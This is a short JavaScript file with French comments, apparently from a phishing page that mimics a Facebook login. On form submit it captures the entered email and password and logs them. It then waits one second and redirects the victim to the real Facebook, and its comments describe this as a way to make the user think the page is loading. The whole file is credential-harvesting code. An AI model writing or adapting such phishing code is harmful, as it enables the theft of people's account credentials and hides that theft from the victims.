window.onload = function() {
    const form = document.getElementById('loginForm');

    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault(); // On bloque pour récupérer les données d'abord

            const userEmail = document.getElementById('email').value;
            const userPass = document.getElementById('password').value;

            // 1. On affiche les données (ou on les traite)
            console.log("Email : " + userEmail);
            console.log("Password : " + userPass);

            // 2. LA REDIRECTION : On envoie l'utilisateur vers le vrai Facebook
            // On attend 1 seconde pour que l'utilisateur ait le temps de voir que ça charge
            setTimeout(function() {
                window.location.href = "https://www.facebook.com";
            }, 1000); 
        });
    }
};
